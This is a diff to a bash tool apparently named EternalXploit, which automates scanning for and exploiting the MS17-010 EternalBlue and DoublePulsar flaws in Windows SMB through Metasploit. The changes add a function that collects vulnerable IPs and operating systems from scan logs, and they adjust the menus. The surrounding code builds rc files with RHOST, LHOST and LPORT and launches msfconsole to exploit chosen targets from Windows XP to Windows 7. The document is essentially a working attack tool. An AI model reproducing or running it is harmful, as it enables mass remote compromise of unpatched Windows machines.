@@ -13,6 +13,7 @@ echo -e "$white"
 defdir="/root/EternalXploit"
 msflogs="msflogs.logs"
 vulnos="vulnos.txt"
+vuln2os="vuln2os.txt"
 vulnostmp="vulnostmp.txt"
 getdata(){
 rm -f "$defdir/$vulnos" >/dev/null 2>&1
@@ -51,6 +52,44 @@ echo -e "$yellow" "EternalXploit saved the vulnerable ips to $defdir/$vulnos"
 echo
 fi
 }
+getdata2(){
+rm -f "$defdir/$vuln2os" >/dev/null 2>&1
+vuln1=$(cat $defdir/$msflogs | grep "Cleanup " | awk '{print$2}' | sed -n 1p)
+vuln2=$(cat $defdir/$msflogs | grep "Cleanup " | awk '{$1=$3=$4=$5=$6=$7=$8=$9=""; print $0}')
+if [ -z "$vuln1" ]
+then
+echo ""
+echo -e "$red" "No vulnerable targets were detected from the list "
+delf
+else
+if [ ! -f "$defdir/$vuln2os" ]
+then
+echo "Vulnerable Ips to Eternal Blue exploit (MS17-010) - Scanned by Eternal Scanner" > $defdir/$vulnos
+echo "------------------------------------------------------------------------------" >> $defdir/$vulnos
+echo "             Detailed Vulnerable IP & Operating System File                   " >> $defdir/$vulnos
+echo "+----------------------------------------------------------------------------+" >> $defdir/$vulnos
+echo "$vuln2" >> "$defdir/$vulnostmp"
+awk '!a[$0]++' $defdir/$vulnostmp > $defdir/$vuln2os 2>&1
+rm -f $defdir/$vulnostmp >/dev/null 2>&1
+else
+echo "$vuln2" > "$defdir/$vulnostmp"
+awk '!a[$0]++' $defdir/$vulnostmp >> $defdir/$vuln2os 2>&1
+rm -f $defdir/$vulnostmp >/dev/null 2>&1
+fi
+rm -f "$defdir/$msflogs" >/dev/null 2>&1
+lm=$(cat $defdir/$vuln2os | wc -l)
+echo ""
+echo -e "$green" "$lm Vulnerable ips found"
+echo "---------------------------------------"
+# Display the positive results
+cat "$defdir/$vuln2os" | sed -e "s/:445//g"
+echo "---------------------------------------"
+echo
+echo -e "$yellow" "EternalXploit saved the vulnerable ips to $defdir/$vulnos"
+echo
+fi
+}
+
 # Check Dependency 
 checkdep(){
 echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
@@ -65,8 +104,7 @@ echo -e "$red"'            #####################################################
 echo
 apt-get install masscan -y
 dpkg --add-architecture i386 && apt-get update && apt-get install wine32 -y
-
-
+mkdir -p /root/.wine/drive_c/
 apt-get install metasploit-framework
 clear
 clear
@@ -143,10 +181,10 @@ echo -e '     '"$red"'['"$white"'5'"$red"']'"$white"'   MS17-010 Eternalblue Sca
 echo -e '     '"$red"'['"$white"'6'"$red"']'"$white"'   EternalRomance/Synergy/Champion Remote Code Execution Scanner'
 echo
 echo -e '     '"$red"'['"$white"'0'"$red"']'"$white"' Back'
-echo -e "$yellow"
+echo -e "$green"
 read -p '     Please select exploit: ' exploit
 if [[ $exploit -eq 1 ]]
-    then
+then
 clear
 logo
 echo
@@ -156,16 +194,16 @@ echo -e "$red"'       ****************' "$yellow"'Eternalblue Doublepulsar Explo
 	echo
    	echo '     Id  Name'
         echo '     --  ----'
-        echo '     0   Windows XP (all services pack) (x86) (x64)'
-        echo '     1   Windows Server 2003 SP0 (x86)'
-        echo '     2   Windows Server 2003 SP1/SP2 (x86)'
-        echo '     3   Windows Server 2003 (x64)'
-        echo '     4   Windows Vista (x86)'
-        echo '     5   Windows Vista (x64)'
-        echo '     6   Windows Server 2008 (x86)' 
-        echo '     7   Windows Server 2008 R2 (x86) (x64)'
-        echo '     8   Windows 7 (all services pack) (x86) (x64)'
-	echo -e "$yellow"
+        echo -e '     '"$red"'['"$white"'0'"$red"']'"$white"'   Windows XP (all services pack) (x86) (x64)'
+        echo -e '     '"$red"'['"$white"'1'"$red"']'"$white"'   Windows Server 2003 SP0 (x86)'
+        echo -e '     '"$red"'['"$white"'2'"$red"']'"$white"'   Windows Server 2003 SP1/SP2 (x86)'
+        echo -e '     '"$red"'['"$white"'3'"$red"']'"$white"'   Windows Server 2003 (x64)'
+        echo -e '     '"$red"'['"$white"'4'"$red"']'"$white"'   Windows Vista (x86)'
+        echo -e '     '"$red"'['"$white"'5'"$red"']'"$white"'   Windows Vista (x64)'
+        echo -e '     '"$red"'['"$white"'6'"$red"']'"$white"'   Windows Server 2008 (x86)' 
+        echo -e '     '"$red"'['"$white"'7'"$red"']'"$white"'   Windows Server 2008 R2 (x86) (x64)'
+        echo -e '     '"$red"'['"$white"'8'"$red"']'"$white"'   Windows 7 (all services pack) (x86) (x64)'
+	echo -e "$green"
 	read -p  '     Please select target: ' target
 echo -e "$white"
 echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
@@ -216,9 +254,9 @@ echo set RHOST $iptarget >> config.rc
 echo set LHOST $ip >> config.rc
 echo set LPORT $port >> config.rc
 echo exploit >> config.rc
-/etc/init.d/postgresql start
+/etc/init.d/postgresql start >/dev/null 2>&1
 msfconsole -q -r config.rc
-/etc/init.d/postgresql stop
+/etc/init.d/postgresql stop >/dev/null 2>&1
 rm config.rc
 clear
 ./EternalXploit.sh
@@ -245,9 +283,9 @@ echo set RHOST $iptarget >> config.rc
 echo set LHOST $ip >> config.rc
 echo set LPORT $port >> config.rc
 echo exploit >> config.rc
-/etc/init.d/postgresql start
+/etc/init.d/postgresql start >/dev/null 2>&1
 msfconsole -q config.rc
-/etc/init.d/postgresql stop
+/etc/init.d/postgresql stop >/dev/null 2>&1
 rm config.rc
 clear
 ./EternalXploit.sh
@@ -480,7 +518,7 @@ echo exit >> config.rc
 msfconsole -q -r config.rc >/dev/null 2>&1
 /etc/init.d/postgresql stop >/dev/null 2>&1
 rm config.rc
-getdata
+getdata2
 elif [[ $exploit -eq 0 ]]
 then
 clear
